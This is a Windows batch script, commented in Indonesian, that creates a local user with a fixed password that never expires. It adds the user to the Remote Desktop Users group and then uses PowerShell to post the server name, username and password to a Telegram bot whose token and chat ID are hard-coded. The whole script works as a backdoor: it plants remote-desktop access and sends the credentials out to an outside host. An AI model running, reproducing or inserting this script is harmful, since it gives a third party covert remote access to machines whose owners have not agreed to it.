@echo off
REM =========================
REM Config - edit di sini
REM =========================
set "BOT_TOKEN=8055884841:AAG_-0dw0NJ5nk2fhOFPDDNh0ciX0T3SCuI" 
set "CHAT_ID=1883446251"
set "USERNAME=Nullcy"
set "PASSWORD=Nullcy1112"    REM gunakan karakter aman atau escape manual jika perlu
set "SERVER_NAME=%COMPUTERNAME%"

REM =========================
REM Do not edit below unless you know what you're doing
REM =========================

echo Membuat user %USERNAME% ...
net user "%USERNAME%" "%PASSWORD%" /add >nul 2>&1
if %errorlevel% neq 0 (
    echo Gagal membuat user %USERNAME%.
    set "STATUS=FAILED: create_user"
    goto send_telegram
) else (
    REM set account to not require password change at next logon (optional)
    net user "%USERNAME%" /logonpasswordchg:no >nul 2>&1
    REM optionally set password never expires:
    net user "%USERNAME%" /expires:never >nul 2>&1
)

echo Menambahkan %USERNAME% ke grup "Remote Desktop Users" ...
net localgroup "Remote Desktop Users" "%USERNAME%" /add >nul 2>&1
if %errorlevel% neq 0 (
    echo Gagal menambahkan ke Remote Desktop Users (mungkin sudah ada).
    REM tapi kita tetap coba verifikasi keberadaan user
)

REM Verifikasi apakah user ada
net user "%USERNAME%" >"%TEMP%\__netuser_check.txt" 2>&1
findstr /C:"Nama user" "%TEMP%\__netuser_check.txt" >nul 2>&1
REM "Nama user" adalah output lokal Indonesia; fallback ke "User name" jika English
if %errorlevel% neq 0 (
    findstr /C:"User name" "%TEMP%\__netuser_check.txt" >nul 2>&1
)

if %errorlevel% equ 0 (
    echo User %USERNAME% terdaftar. Mengasumsikan valid untuk RDP akses (pastikan RDP di-enable).
    set "STATUS=VALID"
) else (
    echo Verifikasi gagal, user tidak ditemukan.
    set "STATUS=FAILED: verify"
)

:send_telegram
REM Build message (escape double quotes for JSON)
setlocal enabledelayedexpansion
set "MSG=Server: %SERVER_NAME%0AUser: %USERNAME%0APass: %PASSWORD%0AStatus: %STATUS%0ATime: %date% %time%"
REM replace literal CRLF encoding for Telegram (%0A used)
REM Use PowerShell to send JSON body
endlocal & set "MSG=%MSG%"

echo Mengirim notifikasi ke Telegram...
powershell -NoProfile -Command ^
  $token = '%BOT_TOKEN%'; ^
  $chat = '%CHAT_ID%'; ^
  $text = "%MSG%"; ^
  $body = @{ chat_id = $chat; text = $text }; ^
  try { Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -ContentType "application/json" -Body (ConvertTo-Json $body) -ErrorAction Stop; exit 0 } ^
  catch { Write-Output "TELEGRAM_ERROR"; exit 1 }

if %errorlevel% equ 0 (
    echo Notifikasi Telegram berhasil dikirim.
) else (
    echo Gagal mengirim notifikasi Telegram.
)

REM cleanup
if exist "%TEMP%\__netuser_check.txt" del /f /q "%TEMP%\__netuser_check.txt" >nul 2>&1

echo Selesai.
pause
